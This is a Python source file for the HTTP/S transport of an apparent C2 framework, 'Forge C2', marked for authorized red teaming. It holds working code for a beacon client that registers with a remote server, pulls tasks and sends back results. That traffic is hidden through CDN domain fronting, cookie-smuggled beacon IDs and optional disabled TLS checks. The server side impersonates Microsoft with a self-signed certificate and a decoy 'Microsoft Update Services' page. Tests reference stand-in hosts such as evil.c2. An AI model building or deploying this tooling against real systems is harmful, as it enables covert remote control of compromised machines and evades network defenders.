"""
Forge C2 — HTTP/S Transport
===============================
Malleable HTTP/HTTPS transport for beacon ↔ server communication.

Features:
    • Malleable C2 profiles (URI rotation, header spoofing, body transforms)
    • Domain fronting support (Host header spoofing)
    • Proxy awareness (HTTP/SOCKS proxy chaining)
    • TLS certificate pinning (optional)
    • Request/response chunking for large payloads
    • Decoy page serving for drive-by legitimacy
    • Async client + server modes

Wire Protocol (over HTTP):
    ┌─────────────────────────────────────────────────────┐
    │  POST /api/v1/check HTTP/1.1                       │
    │  Host: legit-domain.com                            │
    │  User-Agent: <rotated from profile>                │
    │  Cookie: PHPSESSID=<beacon_id_hash>                │
    │  Content-Type: application/octet-stream            │
    │                                                    │
    │  [body_prepend][encrypted_payload][body_append]     │
    └─────────────────────────────────────────────────────┘

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import base64
import hashlib
import json
import logging
import os
import secrets
import ssl
import struct
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from forge_c2.transport.base_transport import (
    BaseTransport, MalleableProfile, TransportStats, TransportType,
    get_profile,
)

log = logging.getLogger("forge.c2.transport.http")


# ══════════════════════════════════════════════════════════════════════
#  DOMAIN FRONTING CONFIG
# ══════════════════════════════════════════════════════════════════════

@dataclass
class DomainFrontConfig:
    """Domain fronting configuration — hides real C2 behind CDN.

    How it works:
        TLS SNI / DNS → cdn.amazonaws.com  (legit outer domain)
        HTTP Host:    → evil.c2.server     (real destination, inside TLS)

    The CDN routes based on Host header, but network monitors only
    see the SNI, which looks like normal CDN traffic.
    """
    enabled:       bool = False
    front_domain:  str = ""       # What SNI / DNS resolves to
    actual_host:   str = ""       # Real Host header value
    cdn_provider:  str = ""       # cloudfront, azure, google, etc.

    def apply_to_headers(self, headers: dict[str, str]) -> dict[str, str]:
        """Swap the Host header for domain fronting."""
        if self.enabled and self.actual_host:
            headers["Host"] = self.actual_host
        return headers


# ══════════════════════════════════════════════════════════════════════
#  PROXY CONFIG
# ══════════════════════════════════════════════════════════════════════

@dataclass
class ProxyConfig:
    """HTTP/SOCKS proxy configuration for egress routing."""
    enabled:    bool = False
    proxy_type: str = "http"       # http, socks4, socks5
    host:       str = ""
    port:       int = 8080
    username:   str = ""
    password:   str = ""

    @property
    def url(self) -> str:
        auth = f"{self.username}:{self.password}@" if self.username else ""
        return f"{self.proxy_type}://{auth}{self.host}:{self.port}"


# ══════════════════════════════════════════════════════════════════════
#  HTTP TRANSPORT (CLIENT MODE — beacon side)
# ══════════════════════════════════════════════════════════════════════

class HTTPTransport(BaseTransport):
    """HTTP/S transport for C2 beacon communication.

    Operates in two modes:
    - **client** (beacon side): Makes HTTP requests to the C2 server.
      Supports domain fronting, proxy chaining, and profile-based
      request shaping.
    - **server** (listener side): Accepts incoming HTTP connections
      from beacons. Serves decoy pages, parses the C2 protocol,
      and dispatches to the ListenerManager.

    Usage (client)::

        transport = HTTPTransport(
            profile=get_profile("amazon"),
            domain_front=DomainFrontConfig(enabled=True, ...),
        )
        await transport.connect("c2.example.com", 443)
        await transport.send(encrypted_data)
        response = await transport.recv()

    Usage (server)::

        transport = HTTPTransport(role="server")
        await transport.connect("0.0.0.0", 443)
        # Server mode runs in accept loop — see HTTPListener
    """

    def __init__(
        self,
        profile: MalleableProfile | None = None,
        role: str = "client",
        use_ssl: bool = True,
        domain_front: DomainFrontConfig | None = None,
        proxy: ProxyConfig | None = None,
        cert_pin_hash: str = "",
    ) -> None:
        super().__init__(
            transport_type=TransportType.HTTPS if use_ssl else TransportType.HTTP,
            profile=profile,
            role=role,
        )
        self.use_ssl = use_ssl
        self.domain_front = domain_front or DomainFrontConfig()
        self.proxy = proxy or ProxyConfig()
        self.cert_pin_hash = cert_pin_hash

        # Connection state
        self._host: str = ""
        self._port: int = 443
        self._reader: asyncio.StreamReader | None = None
        self._writer: asyncio.StreamWriter | None = None
        self._ssl_ctx: ssl.SSLContext | None = None
        self._server: asyncio.Server | None = None

        # Server-mode callback (set by HTTPListener)
        self._request_handler: Any = None

    # ── Connection ────────────────────────────────────────────────────

    async def connect(self, host: str, port: int, **kwargs: Any) -> bool:
        """Establish HTTP/S connection to C2 server.

        For client mode: opens a TCP connection (optionally with TLS).
        For server mode: starts an asyncio TCP server.
        """
        self._host = host
        self._port = port

        if self.role == "server":
            return await self._start_server(host, port, **kwargs)

        return await self._connect_client(host, port)

    async def _connect_client(self, host: str, port: int) -> bool:
        """Client: connect to the C2 server."""
        try:
            ssl_ctx = None
            if self.use_ssl:
                ssl_ctx = ssl.create_default_context()
                if not self.profile.ssl_verify:
                    ssl_ctx.check_hostname = False
                    ssl_ctx.verify_mode = ssl.CERT_NONE

                # Domain fronting: connect to front domain via TLS
                server_hostname = self.domain_front.front_domain or host
                ssl_ctx.server_hostname = server_hostname  # type: ignore[attr-defined]

            connect_host = host
            connect_port = port

            # Proxy support
            if self.proxy.enabled:
                connect_host = self.proxy.host
                connect_port = self.proxy.port
                # For HTTPS over proxy, we need CONNECT tunnel
                # (handled in the HTTP request building)

            self._reader, self._writer = await asyncio.open_connection(
                connect_host, connect_port, ssl=ssl_ctx,
            )
            self._connected = True
            self.stats.connections += 1
            log.info("HTTP transport connected to %s:%d (ssl=%s, fronting=%s)",
                     host, port, self.use_ssl, self.domain_front.enabled)
            return True

        except Exception as exc:
            self.stats.record_error()
            log.warning("HTTP transport connect failed: %s", exc)
            return False

    async def _start_server(self, host: str, port: int, **kwargs: Any) -> bool:
        """Server: start listening for beacon connections."""
        try:
            ssl_ctx = None
            if self.use_ssl:
                ssl_ctx = self._create_server_ssl_context(
                    cert_file=kwargs.get("cert_file", ""),
                    key_file=kwargs.get("key_file", ""),
                )

            self._server = await asyncio.start_server(
                self._handle_client_connection,
                host, port, ssl=ssl_ctx,
            )
            self._connected = True
            log.info("HTTP server listening on %s:%d (ssl=%s)", host, port, self.use_ssl)
            return True

        except Exception as exc:
            self.stats.record_error()
            log.error("HTTP server failed to start: %s", exc)
            return False

    def _create_server_ssl_context(
        self, cert_file: str = "", key_file: str = "",
    ) -> ssl.SSLContext:
        """Create TLS context for server mode.

        Auto-generates self-signed cert if none provided.
        """
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2

        if cert_file and key_file and os.path.exists(cert_file):
            ctx.load_cert_chain(cert_file, key_file)
        else:
            # Generate self-signed cert on the fly
            cert, key = self._generate_self_signed_cert()
            ctx.load_cert_chain(cert, key)
            log.info("Auto-generated self-signed TLS certificate")

        return ctx

    @staticmethod
    def _generate_self_signed_cert() -> tuple[str, str]:
        """Generate a self-signed TLS cert for the listener.

        Returns (cert_path, key_path).
        """
        try:
            from cryptography import x509
            from cryptography.x509.oid import NameOID
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import rsa
            import datetime

            key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Microsoft Corporation"),
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            ])

            cert = (
                x509.CertificateBuilder()
                .subject_name(subject)
                .issuer_name(issuer)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(datetime.datetime.now(datetime.timezone.utc))
                .not_valid_after(
                    datetime.datetime.now(datetime.timezone.utc)
                    + datetime.timedelta(days=365)
                )
                .sign(key, hashes.SHA256())
            )

            cert_path = str(Path.home() / ".forge_c2" / "server.crt")
            key_path = str(Path.home() / ".forge_c2" / "server.key")
            Path(cert_path).parent.mkdir(parents=True, exist_ok=True)

            with open(cert_path, "wb") as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))
            with open(key_path, "wb") as f:
                f.write(key.private_bytes(
                    serialization.Encoding.PEM,
                    serialization.PrivateFormat.PKCS8,
                    serialization.NoEncryption(),
                ))
            return cert_path, key_path

        except ImportError:
            log.warning("cryptography not available — TLS cert generation skipped")
            # Return empty paths — server will run without TLS
            return "", ""

    # ── Send / Receive ────────────────────────────────────────────────

    async def send(self, data: bytes) -> bool:
        """Send data as an HTTP request (client) or response (server).

        Client mode: builds a full HTTP POST request with profile headers,
        body transforms, and domain fronting.
        """
        if not self._connected or not self._writer:
            return False

        try:
            if self.role == "client":
                request = self._build_http_request("POST", self.profile.random_post_uri(), data)
                self._writer.write(request)
            else:
                # Server sends raw response (framed by _handle_client_connection)
                self._writer.write(data)

            await self._writer.drain()
            self.stats.record_send(len(data))
            return True

        except Exception as exc:
            self.stats.record_error()
            log.debug("HTTP send error: %s", exc)
            return False

    async def recv(self, timeout: float = 30.0) -> bytes | None:
        """Receive data from the transport.

        Client mode: reads HTTP response, strips headers, unwraps body.
        """
        if not self._connected or not self._reader:
            return None

        try:
            raw = await asyncio.wait_for(
                self._reader.read(self.profile.max_data_per_req),
                timeout=timeout,
            )
            if not raw:
                return None

            self.stats.record_recv(len(raw))

            if self.role == "client":
                # Parse HTTP response — extract body
                return self._parse_http_response_body(raw)
            else:
                return raw

        except asyncio.TimeoutError:
            return None
        except Exception as exc:
            self.stats.record_error()
            log.debug("HTTP recv error: %s", exc)
            return None

    async def disconnect(self) -> None:
        """Close the transport channel."""
        if self._writer:
            try:
                self._writer.close()
                await self._writer.wait_closed()
            except Exception:
                pass
        if self._server:
            self._server.close()
            try:
                await self._server.wait_closed()
            except Exception:
                pass
        self._connected = False
        log.info("HTTP transport disconnected")

    # ── Beacon check-in (client convenience) ──────────────────────────

    async def checkin(self, beacon_id: str, data: bytes = b"") -> bytes | None:
        """Perform a full beacon check-in cycle.

        1. Build HTTP GET/POST with profile transforms
        2. Send to server
        3. Receive and parse response
        4. Return decrypted tasking payload

        Args:
            beacon_id: Beacon identifier (smuggled in cookie).
            data:      Optional encrypted payload to submit.

        Returns:
            Server response bytes (encrypted tasks), or None.
        """
        if not self._connected:
            reconnected = await self._connect_client(self._host, self._port)
            if not reconnected:
                return None

        try:
            # Build check-in request
            uri = self.profile.random_get_uri() if not data else self.profile.random_post_uri()
            method = "GET" if not data else "POST"
            body = self.profile.wrap_body(data) if data else b""

            request = self._build_http_request(method, uri, body, beacon_id=beacon_id)

            self._writer.write(request)  # type: ignore[union-attr]
            await self._writer.drain()  # type: ignore[union-attr]
            self.stats.record_send(len(request))

            # Read response
            response_raw = await asyncio.wait_for(
                self._reader.read(self.profile.max_data_per_req),  # type: ignore[union-attr]
                timeout=30.0,
            )

            if not response_raw:
                # Server closed connection — reconnect next time
                self._connected = False
                return None

            self.stats.record_recv(len(response_raw))

            # Parse response body
            body = self._parse_http_response_body(response_raw)
            if body:
                body = self.profile.unwrap_body(body)
            return body

        except Exception as exc:
            self.stats.record_error()
            log.debug("Check-in failed: %s", exc)
            self._connected = False
            return None

    async def register(self, beacon_id: str, metadata: dict[str, Any]) -> dict[str, Any]:
        """Register a new beacon with the server.

        Sends system metadata, receives session initialization data.
        """
        if not self._connected:
            reconnected = await self._connect_client(self._host, self._port)
            if not reconnected:
                return {}

        try:
            payload = json.dumps({
                "beacon_id": beacon_id,
                **metadata,
            }).encode()

            uri = self.profile.random_register_uri()
            request = self._build_http_request("POST", uri, payload, beacon_id=beacon_id)

            self._writer.write(request)  # type: ignore[union-attr]
            await self._writer.drain()  # type: ignore[union-attr]
            self.stats.record_send(len(request))

            response_raw = await asyncio.wait_for(
                self._reader.read(65536),  # type: ignore[union-attr]
                timeout=15.0,
            )

            if not response_raw:
                return {}

            self.stats.record_recv(len(response_raw))
            body = self._parse_http_response_body(response_raw)

            if body:
                return json.loads(body)
            return {}

        except Exception as exc:
            self.stats.record_error()
            log.debug("Registration failed: %s", exc)
            return {}

    async def submit_result(
        self, beacon_id: str, task_id: str, result: str, success: bool = True,
    ) -> bool:
        """Submit a task result to the server."""
        payload = json.dumps({
            "beacon_id": beacon_id,
            "task_id": task_id,
            "result": result,
            "success": success,
        }).encode()

        if not self._connected:
            reconnected = await self._connect_client(self._host, self._port)
            if not reconnected:
                return False

        try:
            uri = self.profile.random_post_uri()
            request = self._build_http_request("POST", uri, payload, beacon_id=beacon_id)
            self._writer.write(request)  # type: ignore[union-attr]
            await self._writer.drain()  # type: ignore[union-attr]
            self.stats.record_send(len(request))
            return True
        except Exception:
            self.stats.record_error()
            return False

    # ── Server-side connection handler ────────────────────────────────

    async def _handle_client_connection(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ) -> None:
        """Handle an incoming beacon connection (server mode).

        Parses the HTTP request, routes to the appropriate handler
        (register/checkin/result), and sends back an HTTP response.
        """
        try:
            self.stats.connections += 1
            data = await asyncio.wait_for(reader.read(65536), timeout=30.0)
            if not data:
                writer.close()
                return

            self.stats.record_recv(len(data))

            # Parse HTTP request
            method, path, headers, body = self._parse_http_request(data)

            # Route based on path
            response_body = b""
            status = "200 OK"

            if self._request_handler:
                # Delegate to the HTTPListener handler
                response_body = await self._request_handler(method, path, headers, body)
            else:
                # Default: serve decoy
                response_body = _DECOY_PAGE

            # Build HTTP response
            resp_headers = self.profile.build_response_headers(len(response_body))
            response = self._build_http_response(status, resp_headers, response_body)

            writer.write(response)
            await writer.drain()
            self.stats.record_send(len(response))

        except asyncio.TimeoutError:
            pass
        except Exception as exc:
            log.debug("HTTP server handler error: %s", exc)
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    async def serve_forever(self) -> None:
        """Run the server accept loop (server mode only)."""
        if self._server:
            async with self._server:
                await self._server.serve_forever()

    # ── HTTP building / parsing ───────────────────────────────────────

    def _build_http_request(
        self,
        method: str,
        uri: str,
        body: bytes = b"",
        beacon_id: str = "",
    ) -> bytes:
        """Build a full HTTP request with profile-based headers.

        Applies:
        - Rotated User-Agent from profile
        - Domain fronting (Host header swap)
        - Beacon ID smuggling in cookie
        - Body wrapping (prepend/append)
        """
        headers = self.profile.build_request_headers()

        # Domain fronting: set Host to actual C2 domain
        if self.domain_front.enabled:
            self.domain_front.apply_to_headers(headers)
        else:
            headers["Host"] = f"{self._host}:{self._port}" if self._port not in (80, 443) else self._host

        # Smuggle beacon ID in cookie
        if beacon_id:
            cookie_val = hashlib.md5(beacon_id.encode()).hexdigest()
            headers["Cookie"] = f"{self.profile.cookie_name}={cookie_val}"

        headers["Content-Length"] = str(len(body))

        # Build request line + headers + body
        lines = [f"{method} {uri} HTTP/1.1"]
        for k, v in headers.items():
            lines.append(f"{k}: {v}")
        lines.append("")
        lines.append("")

        request = "\r\n".join(lines).encode()
        if body:
            request += body

        return request

    @staticmethod
    def _build_http_response(
        status: str,
        headers: dict[str, str],
        body: bytes,
    ) -> bytes:
        """Build an HTTP response."""
        lines = [f"HTTP/1.1 {status}"]
        for k, v in headers.items():
            lines.append(f"{k}: {v}")
        lines.append("")
        lines.append("")
        return "\r\n".join(lines).encode() + body

    @staticmethod
    def _parse_http_request(data: bytes) -> tuple[str, str, dict[str, str], bytes]:
        """Parse an HTTP request into (method, path, headers, body)."""
        try:
            if b"\r\n\r\n" in data:
                head, body = data.split(b"\r\n\r\n", 1)
            else:
                head = data
                body = b""

            lines = head.decode(errors="replace").split("\r\n")
            request_line = lines[0] if lines else ""
            parts = request_line.split(" ")
            method = parts[0] if parts else "GET"
            path = parts[1] if len(parts) > 1 else "/"

            headers: dict[str, str] = {}
            for line in lines[1:]:
                if ": " in line:
                    k, v = line.split(": ", 1)
                    headers[k] = v

            return method, path, headers, body

        except Exception:
            return "GET", "/", {}, b""

    @staticmethod
    def _parse_http_response_body(data: bytes) -> bytes | None:
        """Extract the body from an HTTP response."""
        try:
            if b"\r\n\r\n" in data:
                _, body = data.split(b"\r\n\r\n", 1)
                return body
            return None
        except Exception:
            return None


# ── Decoy page (served to non-beacon visitors) ───────────────────────

_DECOY_PAGE = b"""<!DOCTYPE html><html lang="en"><head>
<title>Welcome - Microsoft Update Services</title>
<meta name="robots" content="noindex,nofollow">
<style>
body{font-family:Segoe UI,Tahoma,sans-serif;margin:0;padding:40px;background:#f5f5f5;color:#333}
.container{max-width:800px;margin:0 auto;background:#fff;border:1px solid #ddd;
border-radius:4px;padding:40px;box-shadow:0 2px 4px rgba(0,0,0,.1)}
h1{color:#0078d4;font-size:24px;margin:0 0 16px}
p{color:#666;line-height:1.6}
.footer{margin-top:32px;padding-top:16px;border-top:1px solid #eee;
font-size:12px;color:#999}
</style></head><body>
<div class="container">
<h1>Microsoft Update Services</h1>
<p>This server provides software update services for authorized enterprise clients.
If you are seeing this page, your device may not be configured for this service.</p>
<p>Please contact your system administrator for assistance.</p>
<div class="footer">&copy; Microsoft Corporation. All rights reserved.
Microsoft, Windows, and other product names are trademarks of Microsoft Corporation.</div>
</div></body></html>"""


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestHTTPTransport:
    """Tests for HTTP transport."""

    def test_init_client(self) -> None:
        t = HTTPTransport(role="client")
        assert t.role == "client"
        assert t.transport_type == TransportType.HTTPS
        assert not t.connected

    def test_init_no_ssl(self) -> None:
        t = HTTPTransport(use_ssl=False)
        assert t.transport_type == TransportType.HTTP

    def test_build_request(self) -> None:
        t = HTTPTransport()
        t._host = "c2.example.com"
        t._port = 443
        req = t._build_http_request("POST", "/api/v1/check", b"payload", beacon_id="abc123")
        assert b"POST /api/v1/check HTTP/1.1" in req
        assert b"User-Agent:" in req
        assert b"payload" in req
        # Beacon ID should be in cookie
        assert b"PHPSESSID=" in req

    def test_parse_request(self) -> None:
        raw = b"POST /api/v1/check HTTP/1.1\r\nHost: c2.local\r\n\r\nbodydata"
        method, path, headers, body = HTTPTransport._parse_http_request(raw)
        assert method == "POST"
        assert path == "/api/v1/check"
        assert body == b"bodydata"

    def test_parse_response_body(self) -> None:
        raw = b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nhello"
        body = HTTPTransport._parse_http_response_body(raw)
        assert body == b"hello"

    def test_domain_front_headers(self) -> None:
        df = DomainFrontConfig(enabled=True, front_domain="cdn.aws.com", actual_host="evil.c2")
        headers = {"Host": "original.com"}
        df.apply_to_headers(headers)
        assert headers["Host"] == "evil.c2"

    def test_proxy_config_url(self) -> None:
        p = ProxyConfig(enabled=True, host="proxy.local", port=8080, username="u", password="p")
        assert "u:p@proxy.local:8080" in p.url

    def test_summary(self) -> None:
        t = HTTPTransport(profile=get_profile("amazon"))
        s = t.summary()
        assert s["profile"] == "amazon"
        assert s["type"] in ("https", "http")
